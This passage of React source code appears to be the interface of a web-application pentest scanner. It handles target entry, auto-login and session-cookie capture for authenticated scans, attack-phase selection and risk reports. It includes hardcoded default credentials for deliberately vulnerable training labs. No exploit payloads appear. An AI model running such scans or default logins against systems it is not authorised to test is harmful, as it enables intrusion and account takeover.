            juiceshop:  { url: "http://lab_juiceshop:3000/#/login",                      user: "admin@juice-sh.op",  pass: "admin123" },
            mutillidae: { url: "http://lab_mutillidae/index.php?page=login.php",         user: "admin",              pass: "adminpass"},
            bwapp:      { url: "http://lab_bwapp/bWAPP/login.php",                       user: "bee",                pass: "bug"      },
          };
          const creds = lab && LAB_CREDS[lab];
          if (creds) {
            setLoginUrl(creds.url);
            setLoginUser(creds.user);
            setLoginPass(creds.pass);
            setShowAuthPanel(true);
          }
          if (lab) {
            try {
              const d = await api("/api/lab/autologin","POST",{lab},token);
              if (d?.ok && d?.cookie) {
                setAuthCookie(d.cookie);
                localStorage.setItem("cyberAuthCookie", d.cookie);
              }
            } catch(e) {}
          }
        }}/>

        {/* Target input row */}
        <div style={{marginTop:8}}>
          <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:5}}>
            <label style={{fontSize:11,color:"#64748b",fontWeight:600,letterSpacing:"0.05em",textTransform:"uppercase"}}>Target URL or Domain</label>
            {targetHistory.length>0 && <button onClick={()=>setShowHistory(h=>!h)} style={{background:"#1e293b",border:"1px solid #334155",borderRadius:4,padding:"2px 8px",color:"#60a5fa",fontSize:10,cursor:"pointer"}}>🕐 History ({targetHistory.length})</button>}
            <button onClick={()=>setShowAuthPanel(a=>!a)} style={{background:showAuthPanel||authCookie||authBearer?"#1e3a8a":"#1e293b",border:"1px solid "+(authCookie||authBearer?"#3b82f6":"#334155"),borderRadius:4,padding:"2px 8px",color:authCookie||authBearer?"#93c5fd":"#64748b",fontSize:10,cursor:"pointer"}}>🔑 Auth {authCookie||authBearer?"✓":""}</button>
            <label style={{background:"#1e293b",border:"1px solid "+(customWordlist?"#22c55e":"#334155"),borderRadius:4,padding:"2px 8px",color:customWordlist?"#4ade80":"#64748b",fontSize:10,cursor:"pointer"}}>
              📋 Wordlist {customWordlist?`(${customWordlist.length})`:""}
              <input type="file" accept=".txt" style={{display:"none"}} onChange={e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=ev=>{const lines=ev.target.result.split(/\r?\n/).map(l=>l.trim()).filter(Boolean);setCustomWordlist(lines);};r.readAsText(f);}}/>
            </label>
            {customWordlist && <button onClick={()=>setCustomWordlist(null)} style={{background:"none",border:"none",color:"#ef4444",fontSize:10,cursor:"pointer"}}>✕ clear</button>}
          </div>
          {showHistory && targetHistory.length>0 && (
            <div style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:6,marginBottom:8,overflow:"hidden"}}>
              {targetHistory.map((t,i)=>(
                <div key={i} onClick={()=>{setTarget(t);setShowHistory(false);}} style={{padding:"7px 14px",cursor:"pointer",borderBottom:i<targetHistory.length-1?"1px solid #1e293b":"none",display:"flex",alignItems:"center",gap:8,fontSize:12,color:"#93c5fd",fontFamily:"JetBrains Mono,monospace"}}
                  onMouseEnter={e=>e.currentTarget.style.background="#1e293b"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
                  <span style={{color:"#334155",fontSize:10}}>{i+1}</span>{t}
                </div>
              ))}
            </div>
          )}
          {showAuthPanel && (
            <div style={{background:"#0c1a3d",border:"1px solid #1e3a8a",borderRadius:6,padding:"14px",marginBottom:8,display:"flex",flexDirection:"column",gap:10}}>
              <div style={{fontSize:11,color:"#60a5fa",fontWeight:700,marginBottom:2,letterSpacing:0.5}}>
                🔓 AUTHENTICATED SCANNING — OPTIONAL bonus feature
              </div>
              <div style={{fontSize:10,color:"#cbd5e1",lineHeight:1.7,background:"#020617",padding:"8px 10px",borderRadius:5,border:"1px solid #1e3a8a"}}>
                <b style={{color:"#86efac"}}>Most customers should leave this empty.</b> The scanner already
                tests every public page, API, and form on your target.
                {" "}<br/><br/>
                <b style={{color:"#fbbf24"}}>Only fill this in if BOTH are true:</b>
                {" "}(1) Your target has a login system (SaaS app, dashboard, member portal), AND
                {" "}(2) you want the scanner to test the pages that appear only AFTER login (admin areas, /api/*, user dashboards).
                {" "}<br/><br/>
                <b style={{color:"#fbbf24"}}>How to get your session cookie:</b>
                {" "}Login to your target site in Chrome/Firefox →
                Press F12 → Application/Storage tab → Cookies → your domain →
                Copy the value of <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>PHPSESSID</code>, <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>JSESSIONID</code>, <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>session</code>, or <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>connect.sid</code> →
                Paste below as <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>name=value</code> (multiple cookies separated by <code style={{color:"#86efac",background:"#0c1a3d",padding:"1px 4px",borderRadius:2}}>;</code>).
              </div>

              {/* ── Auto-login: easier alternative for customers who don't
                  want to fish through DevTools. Fills authCookie for them. */}
              <div style={{background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"10px 12px"}}>
                <div style={{fontSize:11,color:"#86efac",fontWeight:700,marginBottom:6}}>
                  🔐 Auto-login (recommended) — give us a username & password and we'll log in for you
                </div>
                <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,marginBottom:8}}>
                  <input value={loginUrl} onChange={e=>setLoginUrl(e.target.value)}
                    placeholder="Login URL (e.g. /login or /login.php)" autoComplete="off"
                    style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
                  <input value={loginUser} onChange={e=>setLoginUser(e.target.value)}
                    placeholder="Username / email" autoComplete="off"
                    name="vl-scan-login-user" data-form-type="other"
                    style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
                  <input value={loginPass} onChange={e=>setLoginPass(e.target.value)}
                    type="password" placeholder="Password" autoComplete="new-password"
                    name="vl-scan-login-pass" data-form-type="other"
                    style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
                </div>
                <div style={{display:"flex",gap:10,alignItems:"center",flexWrap:"wrap"}}>
                  <button
                    onClick={async ()=>{
                      if(!target.trim()){ setAutoLoginStatus("Enter a target first"); return; }
                      if(!loginUrl.trim()||!loginUser.trim()||!loginPass.trim()){
                        setAutoLoginStatus("Login URL + username + password are all required"); return;
                      }
                      setAutoLoginBusy(true); setAutoLoginStatus(null);
                      try {
                        const lr = await api("/api/scan/login","POST",{
                          target, login_url: loginUrl,
                          username: loginUser, password: loginPass,
                          auth_type: "form",
                        }, token);
                        if (lr && lr.login_verified) {
                          setAuthCookie(lr.auth_cookie || "");
                          localStorage.setItem("cyberAuthCookie", lr.auth_cookie || "");
                          if (lr.auth_bearer) {
                            setAuthBearer(lr.auth_bearer);
                            localStorage.setItem("cyberAuthBearer", lr.auth_bearer);
                          }
                          setAutoLoginStatus(lr.fallback ? `ok (via ${lr.fallback})` : "ok");
                        } else {
                          setAutoLoginStatus(lr?.hint || "Login could not be verified");
                        }
                      } catch(e){
                        setAutoLoginStatus("Login request failed: "+(e.message||e));
                      } finally {
                        setAutoLoginBusy(false);
                      }
                    }}
                    disabled={autoLoginBusy}
                    style={{background:autoLoginBusy?"#1e293b":"linear-gradient(135deg,#22c55e,#16a34a)",border:"none",borderRadius:4,padding:"7px 14px",color:autoLoginBusy?"#475569":"#0f172a",fontSize:11,fontWeight:700,cursor:autoLoginBusy?"not-allowed":"pointer"}}>
                    {autoLoginBusy?"Logging in...":"🔐 Auto-login & capture cookie"}
                  </button>
                  {typeof autoLoginStatus === "string" && autoLoginStatus.startsWith("ok") && (
                    <span style={{fontSize:11,color:"#4ade80",fontWeight:600}}>✓ {autoLoginStatus === "ok" ? "Logged in — cookie captured, ready to scan" : "Logged in — " + autoLoginStatus.replace(/^ok\s*/, "")}</span>
                  )}
                  {typeof autoLoginStatus === "string" && !autoLoginStatus.startsWith("ok") && (
                    <span style={{fontSize:11,color:"#f87171",fontWeight:600}}>✗ {autoLoginStatus}</span>
                  )}
                </div>
              </div>

              <div style={{fontSize:10,color:"#475569",textAlign:"center",margin:"2px 0"}}>— OR paste cookie / bearer manually —</div>
              <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
                <div style={{flex:1,minWidth:240}}>
                  <div style={{fontSize:10,color:"#64748b",marginBottom:3,fontWeight:600}}>Session Cookie</div>
                  <input value={authCookie} onChange={e=>{setAuthCookie(e.target.value);localStorage.setItem("cyberAuthCookie",e.target.value);}} placeholder="PHPSESSID=abc123; sid=xyz; csrf_token=..." style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"8px 11px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
                </div>
                <div style={{flex:1,minWidth:240}}>
                  <div style={{fontSize:10,color:"#64748b",marginBottom:3,fontWeight:600}}>Bearer Token (JWT / API key)</div>
                  <input value={authBearer} onChange={e=>{setAuthBearer(e.target.value);localStorage.setItem("cyberAuthBearer",e.target.value);}} placeholder="eyJhbGciOiJIUzI1NiJ9..." style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"8px 11px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
                </div>
              </div>
              {(authCookie||authBearer) ? (
                <div style={{fontSize:11,color:"#4ade80",fontWeight:700,display:"flex",alignItems:"center",gap:6}}>
                  ✓ AUTHENTICATED MODE ACTIVE — scanners will request your target's pages as the logged-in user. Logged-in pages, /api/* endpoints, /admin/* and /dashboard/* will all be tested.
                </div>
              ) : (
                <div style={{fontSize:10,color:"#94a3b8",fontStyle:"italic"}}>
                  💡 No credentials added — the scanner will test all PUBLIC pages of the target (homepage, public APIs, robots.txt, common paths, etc.). This is the right mode for static / marketing sites with no login. For SaaS apps with a login system, adding credentials above unlocks the behind-login surface too.
                </div>
              )}
              {(authCookie||authBearer) && (
                <button onClick={()=>{setAuthCookie("");setAuthBearer("");localStorage.removeItem("cyberAuthCookie");localStorage.removeItem("cyberAuthBearer");}} style={{alignSelf:"flex-start",background:"#1e293b",border:"1px solid #334155",borderRadius:4,padding:"4px 10px",color:"#ef4444",fontSize:10,cursor:"pointer",fontWeight:600}}>
                  ✕ Clear auth credentials
                </button>
              )}
            </div>
          )}
          <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
            {/* Hidden honeypot inputs — Chrome fills these FIRST, leaving the
                real target field alone. Combined with autoComplete="off" +
                a non-standard name + data-form-type="other" this kills the
                "Chrome puts the user's ADMIN username in the target field"
                annoyance for good. */}
            <input type="text"     name="username" tabIndex={-1} autoComplete="username"         defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
            <input type="password" name="password" tabIndex={-1} autoComplete="current-password" defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
            <input value={target} onChange={e=>setTarget(e.target.value)} onFocus={()=>setShowHistory(targetHistory.length>0)}
              placeholder="example.com  or  http://192.168.1.1:8080"
              autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck={false}
              name="webapp-pentest-target" data-form-type="other" aria-autocomplete="none"
              style={{flex:3,minWidth:220,background:"#020617",border:"1px solid "+(running?"#3b82f6":"#1e3a8a"),borderRadius:6,padding:"11px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none",transition:"border-color 0.2s"}}/>
            {["lab_dvwa","lab_bwapp","lab_webgoat","lab_mutillidae"].some(l=>target.includes(l)) && !(authCookie||authBearer) && !running && (
              <div style={{background:"#451a03",border:"1px solid #f97316",borderRadius:6,padding:"8px 14px",color:"#fb923c",fontSize:11,fontWeight:600,display:"flex",alignItems:"center",gap:8,whiteSpace:"nowrap"}}>
                ⚠ Auth required — click the target button to auto-login first
              </div>
            )}
            {!running ? (
              <button onClick={run} disabled={!target.trim()}
                style={{background:target.trim()?"linear-gradient(135deg,#3b82f6,#06b6d4)":"#1e293b",border:"none",borderRadius:6,padding:"11px 28px",color:target.trim()?"#fff":"#475569",fontSize:13,fontWeight:700,cursor:target.trim()?"pointer":"not-allowed",whiteSpace:"nowrap",transition:"all 0.2s"}}>
                ▶ Start Full Pentest
              </button>
            ) : (
              <button disabled style={{background:"#0f172a",border:"1px solid #3b82f6",borderRadius:6,padding:"11px 24px",color:"#60a5fa",fontSize:13,fontWeight:700,cursor:"not-allowed",display:"flex",alignItems:"center",gap:8,whiteSpace:"nowrap"}}>
                <div style={{width:12,height:12,border:"2px solid #3b82f6",borderTopColor:"transparent",borderRadius:"50%",animation:"spin .8s linear infinite",flexShrink:0}}/>
                Scanning...
              </button>
            )}
            {running && (
              <button onClick={stop} disabled={stopped}
                style={{background:"linear-gradient(135deg,#dc2626,#991b1b)",border:"none",borderRadius:6,padding:"11px 22px",color:"#fff",fontSize:13,fontWeight:700,cursor:stopped?"not-allowed":"pointer",display:"flex",alignItems:"center",gap:7,opacity:stopped?0.5:1,transition:"opacity 0.2s",whiteSpace:"nowrap"}}>
                ■ Stop Scan
              </button>
            )}
            {finished && (() => {
              const allF=[];
              PHASES.forEach(ph=>{ if(allResults[ph.tool]?.findings) allResults[ph.tool].findings.forEach(f=>{ if(f.severity!=="INFO") allF.push(f); }); });
              if(allResults["xss"]?.vulnerable)   allF.push({severity:"CRITICAL"});
              if(allResults["cors"]?.vulnerable)   allF.push({severity:"HIGH"});
              if(allResults["sqlmap"]?.vulnerable) allF.push({severity:"CRITICAL"});
              const _pen=allF.reduce((s,f)=>s+({CRITICAL:15,HIGH:8,MEDIUM:3,LOW:1}[f.severity]||0),0);
              const sc=Math.max(0,100-_pen);
              const lb=sc<40?"CRITICAL":sc<70?"HIGH":sc<90?"MEDIUM":sc<100?"LOW":"SAFE";
              const col={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",SAFE:"#16a34a"}[lb];
              return <>
                <div style={{background:col,borderRadius:6,padding:"11px 16px",color:"#fff",fontSize:12,fontWeight:700,whiteSpace:"nowrap"}}>⚠ RISK: {lb} ({sc}/100)</div>
                <button onClick={()=>setShowPDFModal(true)} style={{background:"#ef4444",border:"none",borderRadius:6,padding:"11px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer",whiteSpace:"nowrap"}}>📄 Report</button>
                <button onClick={dlCSV} style={{background:"#166534",border:"none",borderRadius:6,padding:"11px 16px",color:"#fff",fontSize:13,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap"}}>📊 CSV</button>
                <button onClick={dlJSON} style={{background:"#1e3a8a",border:"none",borderRadius:6,padding:"11px 16px",color:"#fff",fontSize:13,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap"}}>🗃 JSON</button>
                <button onClick={dlSARIF} title="GitHub Code Scanning / GitLab SAST / Defender for Cloud compatible" style={{background:"#7c3aed",border:"none",borderRadius:6,padding:"11px 16px",color:"#fff",fontSize:13,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap"}}>⚡ SARIF</button>
              </>;
            })()}
          </div>
        </div>
      </div>

      <div style={{marginBottom:16}}><Terminal lines={lines} height={120}/></div>

      {/* TABS */}
      <div style={{display:"flex",gap:6,marginBottom:14,flexWrap:"wrap"}}>
        {[
          {id:"phases",    label:"📡 Scan Phases"},
          {id:"findings",  label:"🚨 Findings"},
          {id:"methodology",label:"📚 Methodology"},
        ].map(t=>(
          <button key={t.id} onClick={()=>setTab(t.id)}
            style={{background:tab===t.id?"#1e3a8a":"#0f172a",border:"1px solid "+(tab===t.id?"#3b82f6":"#1e293b"),borderRadius:6,padding:"7px 14px",color:tab===t.id?"#fff":"#64748b",fontSize:12,fontWeight:600,cursor:"pointer"}}>
            {t.label}
          </button>
        ))}
      </div>

      {/* PHASES TAB */}
      {tab==="phases" && (
      <div style={{display:"flex",flexDirection:"column",gap:8}}>

        {/* Badge Legend */}
        <div style={{display:"flex",alignItems:"center",gap:16,padding:"8px 14px",background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:8,flexWrap:"wrap"}}>
          <span style={{fontSize:11,color:"#475569",fontWeight:700,letterSpacing:1}}>RESULTS:</span>
          {[
            {label:"SECURE",     color:"#4ade80", bg:"#052e16", desc:"No vulnerability found"},
            {label:"VULNERABLE", color:"#f87171", bg:"#1c0000", desc:"Security issue detected"},
            {label:"SKIPPED",    color:"#fb923c", bg:"#1c0a00", desc:"Not applicable for this target"},
            {label:"ERROR",      color:"#f87171", bg:"#1c0000", desc:"Tool had a problem"},
          ].map((b,i)=>(
            <div key={i} style={{display:"flex",alignItems:"center",gap:5}}>
              <span style={{background:b.bg,border:`1px solid ${b.color}50`,color:b.color,fontSize:9,fontWeight:700,padding:"2px 7px",borderRadius:4}}>{b.label}</span>
              <span style={{fontSize:10,color:"#475569"}}>{b.desc}</span>
            </div>
          ))}
        </div>

        {/* ─── LIVE SCAN TELEMETRY ─── shows only while scan is running.
             Customer watches findings accumulate in real-time + sees ETA,
             current phase, and progress bar. Trust-building feedback —
             without this, scans feel like a 5-min black-box spinner. */}
        {running && (() => {
          const doneCount = done.length;
          const totalCount = (selectedPhases?.size || PHASES.length) || 1;
          const elapsed = Math.floor((Date.now() - scanStart) / 1000);
          const fmt = s => `${Math.floor(s/60)}:${String(s%60).padStart(2,"0")}`;
          const eta = doneCount > 0 ? Math.max(0, Math.floor((elapsed * totalCount / doneCount) - elapsed)) : null;
          const pct = Math.min(100, Math.round(doneCount / totalCount * 100));
          const currentPhase = curPhase >= 0 ? PHASES[curPhase] : null;
          const totalFindings = liveCounts.CRITICAL + liveCounts.HIGH + liveCounts.MEDIUM + liveCounts.LOW;
          return (
            <div style={{background:"linear-gradient(180deg,#0a0f1e 0%,#0f172a 100%)",border:"1px solid #1e3a8a",borderRadius:10,padding:"12px 16px",display:"flex",flexDirection:"column",gap:10}}>
              {/* Row 1: progress + current phase + timing */}
              <div style={{display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
                <div style={{display:"flex",alignItems:"center",gap:8,flex:"1 1 280px",minWidth:240}}>
                  <span style={{fontSize:11,color:"#64748b",fontWeight:700,letterSpacing:1}}>SCANNING</span>
                  <span style={{fontSize:13,color:"#e2e8f0",fontWeight:600,fontFamily:"monospace"}}>
                    {currentPhase ? `${currentPhase.icon||""} ${currentPhase.name}` : "Initializing..."}
                  </span>
                </div>
                <div style={{display:"flex",alignItems:"center",gap:14,fontSize:11,fontFamily:"monospace",color:"#94a3b8"}}>
                  <span>Phase <b style={{color:"#3b82f6"}}>{doneCount}</b>/<b style={{color:"#e2e8f0"}}>{totalCount}</b></span>
                  <span>Elapsed <b style={{color:"#22c55e"}}>{fmt(elapsed)}</b></span>
                  {eta !== null && <span>ETA <b style={{color:"#f59e0b"}}>~{fmt(eta)}</b></span>}
                </div>
              </div>
              {/* Row 2: progress bar */}
              <div style={{height:6,background:"#0a0f1e",borderRadius:3,overflow:"hidden",border:"1px solid #1e293b"}}>
                <div style={{height:"100%",width:`${pct}%`,background:"linear-gradient(90deg,#3b82f6 0%,#22c55e 100%)",transition:"width 0.6s ease",borderRadius:3}}/>
              </div>
              {/* Row 3: live finding counter */}
              <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
                <span style={{fontSize:11,color:"#475569",fontWeight:700,letterSpacing:1}}>FINDINGS SO FAR:</span>
                {[
                  {label:"CRITICAL", n:liveCounts.CRITICAL, color:"#f87171", bg:"#1c0000"},
                  {label:"HIGH",     n:liveCounts.HIGH,     color:"#fb923c", bg:"#1c0a00"},
                  {label:"MEDIUM",   n:liveCounts.MEDIUM,   color:"#fbbf24", bg:"#1c1500"},
                  {label:"LOW",      n:liveCounts.LOW,      color:"#4ade80", bg:"#052e16"},
                ].map(s=>(
                  <span key={s.label} style={{background:s.bg,border:`1px solid ${s.color}50`,color:s.color,fontSize:11,fontWeight:700,padding:"3px 9px",borderRadius:5,fontFamily:"monospace"}}>
                    {s.n} {s.label}
                  </span>
                ))}
                {totalFindings === 0 && (
                  <span style={{fontSize:11,color:"#475569",fontStyle:"italic"}}>No issues found yet — scan in progress...</span>
                )}
              </div>
            </div>
          );
        })()}

        {/* Phase selection controls */}
        {!running && (
          <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:4,flexWrap:"wrap"}}>
            <span style={{color:"#64748b",fontSize:12,fontFamily:"monospace"}}>{selectedPhases.size}/{PHASES.length} phases selected</span>
            <button onClick={()=>setSelectedPhases(new Set(PHASES.map((_,i)=>i)))}
              style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#22c55e",fontSize:11,fontWeight:700,cursor:"pointer"}}>
              Select All
            </button>
            <button onClick={()=>setSelectedPhases(new Set())}
              style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#ef4444",fontSize:11,fontWeight:700,cursor:"pointer"}}>
              Clear All
            </button>
            {[
              {label:"Quick (Recon)",  phases:[0,1,2,3,4,5,6,7,8,9,13]},
              {label:"Web Attacks",    phases:[10,11,12,14,15,16,17,18,20,21,22]},
              {label:`Full (All ${PHASES.length})`,  phases:PHASES.map((_,i)=>i)},
            ].map(preset=>(
              <button key={preset.label} onClick={()=>setSelectedPhases(new Set(preset.phases))}
                style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 12px",color:"#93c5fd",fontSize:11,fontWeight:600,cursor:"pointer"}}>
                {preset.label}
              </button>
            ))}
          </div>
        )}
        {PHASES.map((ph,i) => {
          const isActive   = curPhase === i;
          const isDone     = done.includes(i);
          const isSkipped  = skipped.includes(i);
          const isFailed   = failed.includes(i) && !isSkipped;
          const res        = allResults[ph.tool];
          const isSQLi     = ph.tool === "sqlmap" && res && res.vulnerable;
          const isVuln     = res && res.vulnerable && !isSQLi;
          const leftCol    = isActive?"#3b82f6":isDone?(isSkipped?"#f59e0b":isFailed?"#ef4444":isSQLi||isVuln?"#f97316":"#22c55e"):"#1e293b";
          const borderCol  = isActive?"#1e3a8a":isDone?(isSkipped?"#451a03":isFailed?"#450a0a":isSQLi||isVuln?"#431407":"#052e16"):"#1e293b";
          const circBg     = isDone?(isSkipped?"#1c1000":isFailed?"#1c0505":isSQLi?"#1c0a0a":"#052e16"):isActive?"#0c1a3d":"#020617";
          const circBord   = isDone?(isSkipped?"#f59e0b":isFailed?"#ef4444":isSQLi||isVuln?"#f97316":"#22c55e"):isActive?"#3b82f6":"#1e293b";
          const isSelected   = selectedPhases.has(i);
          const toolLocked   = isTrial && !TRIAL_TOOLS.has(ph.tool) && !isSuperAdmin;
          const secHdr       = SECTION_HEADERS[ph.tool];
          return (
            <React.Fragment key={i}>
            {secHdr && (
              <div style={{display:"flex",alignItems:"center",gap:10,marginTop:i===0?0:10,marginBottom:6,paddingLeft:4}}>
                <div style={{width:3,height:32,background:secHdr.color,borderRadius:2,flexShrink:0}}/>
                <div style={{flex:1}}>
                  <div style={{fontSize:11,fontWeight:700,color:secHdr.color,letterSpacing:"0.05em",textTransform:"uppercase"}}>{secHdr.label}</div>
                  <div style={{fontSize:9,color:"#475569",fontFamily:"JetBrains Mono,monospace"}}>{secHdr.sub}</div>
                </div>
                {isTrial && secHdr.label.includes("Section 1") && <span style={{fontSize:9,color:"#f59e0b",fontWeight:700,background:"rgba(245,158,11,0.1)",padding:"2px 6px",borderRadius:3}}>TRIAL</span>}
                {isTrial && !secHdr.label.includes("Section 1") && <span style={{fontSize:9,color:"#6b7280",fontWeight:700,background:"rgba(107,114,128,0.1)",padding:"2px 6px",borderRadius:3}}>🔒 PRO</span>}
              </div>
            )}
            <div key={i} onClick={()=>{
                if(running) return;
                if(toolLocked){ alert("Upgrade to Pro to access this scanner."); return; }
                setSelectedPhases(p=>{ const n=new Set(p); n.has(i)?n.delete(i):n.add(i); return n; });
              }}
              style={{background:toolLocked?"#0a0f1e":"#0f172a",border:"1px solid "+(toolLocked?"#1e293b":borderCol),borderLeft:`3px solid ${toolLocked?"#374151":leftCol}`,borderRadius:8,padding:"12px 18px",display:"flex",alignItems:"center",gap:14,cursor:toolLocked?"not-allowed":running?"default":"pointer",opacity:toolLocked?0.75:isSelected?1:0.35,transition:"all 0.2s"}}>
              <div style={{width:32,height:32,borderRadius:"50%",background:circBg,border:"2px solid "+circBord,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontSize:14}}>
                {isDone ? (isSkipped?"⚠":isFailed?"✗":isSQLi?"✗":"✓") : isActive ? (
                  <div style={{width:12,height:12,border:"2px solid #3b82f6",borderTopColor:"transparent",borderRadius:"50%",animation:"spin .8s linear infinite"}}/>
                ) : (
                  <span style={{fontSize:10,color:"#334155",fontFamily:"JetBrains Mono,monospace",fontWeight:600}}>{String(i+1).padStart(2,"0")}</span>
                )}
              </div>
              <div style={{flex:1}}>
                <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:3,flexWrap:"wrap"}}>
                  <span style={{fontSize:13,fontWeight:600,color:toolLocked?"#64748b":isDone?"#f1f5f9":isActive?"#93c5fd":"#475569"}}>{ph.name}</span>
                  {toolLocked && <span style={{fontSize:10}}>🔒</span>}
                  {isActive  && <Badge label="RUNNING"   color="blue"   size="xs"/>}
                  {isDone && !isFailed && !isSkipped && !isSQLi && !isVuln && <Badge label="SECURE"     color="green"  size="xs"/>}
                  {isDone && !isFailed && !isSkipped && (isSQLi||isVuln)   && <Badge label="VULNERABLE" color="red"   size="xs"/>}
                  {isDone && isFailed  && <Badge label="ERROR"     color="red"    size="xs"/>}
                  {isDone && isSkipped && <Badge label="SKIPPED"   color="orange" size="xs"/>}
                  {isDone && isSkipped && <span style={{fontSize:10,color:"#94a3b8",fontStyle:"italic",marginLeft:4}}>Not applicable for this target</span>}
                </div>
                <span style={{fontSize:10,color:"#334155",fontFamily:"JetBrains Mono,monospace",background:"#020617",border:"1px solid #1e293b",borderRadius:3,padding:"1px 6px"}}>{ph.tool}</span>
              </div>
              {isDone && res && (
                <div style={{textAlign:"right"}}>
                  {res.total_open !== undefined && <div style={{fontSize:11,color:"#60a5fa",fontFamily:"JetBrains Mono,monospace"}}>{res.total_open} ports</div>}
                  {res.total_findings !== undefined && <div style={{fontSize:11,color:res.total_findings>0?"#f87171":"#4ade80",fontFamily:"JetBrains Mono,monospace"}}>{res.total_findings} findings</div>}
                  {res.total !== undefined && <div style={{fontSize:11,color:"#a78bfa",fontFamily:"JetBrains Mono,monospace"}}>{res.total} paths</div>}
                  {res.vulnerable !== undefined && <div style={{fontSize:11,color:res.vulnerable?"#f87171":"#4ade80",fontFamily:"JetBrains Mono,monospace",fontWeight:700}}>{res.vulnerable?"VULNERABLE":"SECURE"}</div>}
                </div>
              )}
              {isDone && res && (
                <button onClick={e=>{e.stopPropagation(); setExpandedTile(expandedTile===i?null:i);}}
                  style={{background:expandedTile===i?"#1e3a8a":"#1e293b",border:"1px solid "+(expandedTile===i?"#3b82f6":"#334155"),borderRadius:5,padding:"4px 10px",color:"#93c5fd",fontSize:10,fontWeight:600,cursor:"pointer",flexShrink:0,whiteSpace:"nowrap"}}>
                  {expandedTile===i?"Hide":"Details"}
                </button>
              )}
              {!running && target && (
                <button onClick={e=>{e.stopPropagation();runSingle(ph,i);}}
                  style={{background:"#1e293b",border:"1px solid #334155",borderRadius:5,padding:"4px 10px",color:"#60a5fa",fontSize:10,fontWeight:600,cursor:"pointer",flexShrink:0,whiteSpace:"nowrap"}}>
                  {isDone?"Re-run":"Run"}
                </button>
              )}
            </div>
            {/* Expansion panel — surfaces real-world error/success details
                so the customer never has to crack open DevTools or SSH into
                the VPS to figure out why a scan failed. */}
            {expandedTile === i && isDone && res && (
              <div style={{marginTop:-4,marginBottom:8,padding:"14px 18px",background:"#0a1224",border:"1px solid "+(isFailed?"#7f1d1d":isVuln||isSQLi?"#7c2d12":"#14532d"),borderLeft:"3px solid "+(isFailed?"#ef4444":isVuln||isSQLi?"#f97316":"#22c55e"),borderRadius:"0 8px 8px 0",fontSize:12,lineHeight:1.55}}>
                {/* Header */}
                <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:10}}>
                  <span style={{fontSize:14}}>{isFailed?"❌":isVuln||isSQLi?"⚠️":"✅"}</span>
                  <span style={{fontSize:12,fontWeight:800,letterSpacing:1.2,color:isFailed?"#fca5a5":isVuln||isSQLi?"#fdba74":"#86efac"}}>
                    {isFailed?"SCAN FAILED — DETAILS":isVuln||isSQLi?"FINDINGS — REVIEW":"SCAN COMPLETE — NO ISSUES"}
                  </span>
                </div>

                {/* Error message (from {error: ...} in response) */}
                {(res.error || res.detail) && (
                  <div style={{padding:"10px 12px",marginBottom:10,background:"rgba(220,38,38,0.08)",border:"1px solid rgba(220,38,38,0.35)",borderRadius:6,color:"#fecaca"}}>
                    <div style={{fontSize:10,fontWeight:800,color:"#f87171",letterSpacing:1.5,marginBottom:4}}>ERROR</div>
                    <div style={{wordBreak:"break-word"}}>{res.error || res.detail}</div>
                  </div>
                )}

                {/* Suggested action — the friendly "what to try" hint */}
                {res.suggested_action && (
                  <div style={{padding:"10px 12px",marginBottom:10,background:"rgba(251,191,36,0.10)",border:"1px solid rgba(251,191,36,0.35)",borderRadius:6,color:"#fde68a"}}>
                    <span style={{fontSize:11,fontWeight:800,color:"#fbbf24",marginRight:6}}>💡 What to try:</span>
                    {res.suggested_action}
